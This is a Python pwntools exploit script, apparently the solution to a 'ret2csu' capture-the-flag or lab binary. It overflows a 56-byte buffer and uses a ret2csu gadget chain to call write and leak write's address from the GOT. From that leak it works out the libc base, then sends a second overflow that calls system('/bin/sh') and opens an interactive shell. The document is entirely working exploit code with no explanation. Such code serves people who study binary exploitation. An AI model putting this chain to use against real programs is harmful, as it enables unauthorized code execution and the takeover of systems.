from pwn import *

elf = context.binary = ELF('./ret2csu',checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)

io = process()

payload = b'A'*56
payload += pack(0x000000000040120a)
payload += pack(0)
payload += pack(1)
payload += pack(1)
payload += pack(elf.got.write)
payload += pack(6)
payload += pack(elf.got.write)
payload += pack(0x00000000004011f0)
payload += pack(0)*7
payload += pack(elf.sym.vuln)

io.sendline(payload)
io.recvuntil(b'Enter Data - ')
leak = io.recv(6)
leak_int = unpack(leak,'all')
libc.address = leak_int - libc.sym.write

payload = b'B'*56
payload += pack(0x0000000000401213)
payload += pack(next(libc.search(b'/bin/sh')))
payload += pack(0x000000000040101a)
payload += pack(libc.sym.system)

io.sendline(payload)

io.interactive()
